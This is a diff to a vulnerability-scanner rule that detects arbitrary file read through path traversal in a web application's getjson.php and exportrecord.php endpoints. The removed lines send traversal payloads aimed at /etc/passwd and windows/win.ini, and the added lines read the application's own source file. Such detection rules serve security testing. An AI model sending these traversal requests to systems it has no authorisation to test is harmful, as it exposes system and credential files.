@@ -11,17 +11,15 @@ rules:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
       body: |
         jsondata[url]=../php/getjson.php
-    expression: response.status == 200 && response.body.bcontains(b"$_POST")
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');") && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
   r2:
     request:
       cache: true
       method: POST
-      path: /php/getjson.php
+      path: /php/exportrecord.php?downname=../php/getjson.php
       headers:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-      body: |
-        jsondata[filename]=../../../../../../windows/win.ini
-    expression: response.status == 200 && response.body.bcontains(b"[fonts]") && response.body.bcontains(b"[extensions]")
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');") && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
   r3:
     request:
       cache: true
@@ -30,23 +28,9 @@ rules:
       headers:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
       body: |
-        jsondata[filename]=../../../../../../../etc/passwd
-    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
-  r4:
-    request:
-      cache: true
-      method: GET
-      path: /php/exportrecord.php?downname=c:/windows/win.ini
-    expression: response.status == 200 && response.body.bcontains(b"[fonts]") && response.body.bcontains(b"[extensions]")
-  r5:
-    request:
-      cache: true
-      method: POST
-      path: /php/exportrecord.php?downname=../../../../../etc/passwd
-      headers:
-        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body) && response.body.bcontains(b"bin")
-expression: r1() || r2() || r3() || r4() || r5()
+        jsondata[filename]=../php/getjson.php
+    expression: response.status == 200 && response.body.bcontains(b"require_once ('conversion.php');") && response.body.bcontains(b"$json_string = file_get_contents($fullpath);")
+expression: r1() || r2() || r3()
 detail:
   author: york
   links:
